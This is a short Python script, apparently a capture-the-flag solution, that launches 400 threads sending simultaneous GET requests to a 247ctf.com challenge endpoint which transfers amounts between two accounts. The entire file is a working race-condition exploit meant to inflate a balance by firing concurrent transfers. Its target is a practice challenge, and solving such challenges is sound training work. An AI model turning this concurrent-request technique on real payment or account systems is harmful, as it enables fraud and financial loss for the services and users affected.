import threading
import requests

def thread_function(url):
    response = requests.get(url)

c = []
for i in range(0, 200):
    c.append(threading.Thread(target=thread_function, args=('https://7e94cc9f91ba98b8.247ctf.com/?from=1&to=2&amount=100',)))
    c.append(threading.Thread(target=thread_function, args=('https://7e94cc9f91ba98b8.247ctf.com/?from=2&to=1&amount=50',)))

for i in c:
    i.start()